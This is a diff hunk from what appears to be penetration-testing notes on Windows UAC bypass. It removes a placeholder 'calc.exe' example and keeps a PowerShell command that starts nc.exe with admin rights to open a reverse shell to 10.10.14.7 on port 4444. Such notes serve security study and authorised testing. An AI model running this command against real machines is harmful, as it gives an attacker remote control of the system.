@@ -69,8 +69,6 @@ alias:: UAC
 	  #+END_CAUTION
 	- If UAC is already disabled (`ConsentPromptBehaviorAdmin` is `0`) you can execute a reverse shell with admin privileges (high integrity level) using something like:
 	  ```powershell
-	  #Put your reverse shell instead of "calc.exe"
-	  Start-Process powershell -Verb runAs "calc.exe"
 	  Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 	  ```
 	- Noisy brute-force UAC bypass
